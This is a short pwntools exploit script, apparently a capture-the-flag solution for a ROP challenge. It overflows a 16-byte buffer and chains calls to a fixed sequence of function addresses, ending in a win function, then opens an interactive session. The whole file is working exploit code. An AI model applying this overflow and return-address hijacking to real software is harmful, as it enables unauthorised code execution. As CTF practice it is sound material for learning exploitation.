from pwn import *
#target=remote('ctf.umbccd.io' ,4100)
target=process('./rop')
context.terminal=["tmux","split","-h"]
gdb.attach(target,gdbscript="break *0x080496F3")

print(target.recvuntil("boys?\n"))

winfunc=0x0804967e
retaddr=0x08049729

ggrove=0x080495E4
jjunc=0x0804954A
ddepot=0x080494B0
sshores=0x08049416
ttowers=0x0804937C
llodge=0x080492E2
llake=0x08049248

order=[ttowers,jjunc,sshores,ggrove,llodge,ddepot,llake,winfunc]
for addr in order:
    payload="A"*16
    payload+=p32(addr)
    payload+=p32(retaddr)
    target.send(payload)
    sleep(1)

target.interactive()
